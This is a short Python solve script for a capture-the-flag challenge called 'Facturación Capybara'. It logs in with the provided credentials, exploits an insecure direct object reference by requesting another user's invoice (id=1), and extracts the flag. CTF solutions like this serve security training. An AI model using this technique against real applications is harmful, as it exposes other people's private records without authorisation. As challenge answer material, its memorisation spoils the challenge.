#!/usr/bin/env python3
"""
Solve script for Challenge #6: Facturación Capybara
Exploits IDOR to access Capitán Capybara's VIP invoice (ID 1).
"""

import sys
import requests
import re

BASE_URL = "http://192.99.247.166:8082"

def solve():
    session = requests.Session()
    
    # 1. Login with provided credentials
    login_data = {"usuario": "capybarito", "password": "capybarito123"}
    resp = session.post(f"{BASE_URL}/index.php", data=login_data, timeout=10)
    
    if resp.status_code not in (200, 302):
        print("Login failed", file=sys.stderr)
        return 1
    
    # 2. Access invoice ID 1 (VIP invoice of Capitán Capybara)
    resp = session.get(f"{BASE_URL}/factura.php?id=1", timeout=10)
    
    # Extract flag from response
    flag_match = re.search(r'EVIL\{[^}]+\}', resp.text)
    if flag_match:
        print(flag_match.group(0))
        return 0
    
    print("Flag not found in response", file=sys.stderr)
    return 1

if __name__ == "__main__":
    sys.exit(solve())